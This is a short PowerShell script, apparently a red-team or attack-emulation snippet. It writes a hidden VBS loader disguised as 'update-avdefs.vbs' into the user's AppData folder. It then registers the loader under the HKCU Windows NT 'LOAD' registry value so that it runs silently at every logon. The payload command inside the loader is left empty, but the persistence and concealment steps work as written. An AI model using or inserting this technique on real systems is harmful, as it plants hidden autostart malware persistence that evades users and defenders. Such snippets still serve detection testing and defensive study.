$tmpdir = $env:APPDATA
$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"
$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
$vbs += 'oShell.run(""),0,true'
$vbs | Out-File $payloadvbsloaderpath -Force
$fileObj = get-item $payloadvbsloaderpath -Force
$fileObj.Attributes="Hidden"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath
Test-Path  $env:APPDATA\update-avdefs.vbs -PathType Leaf
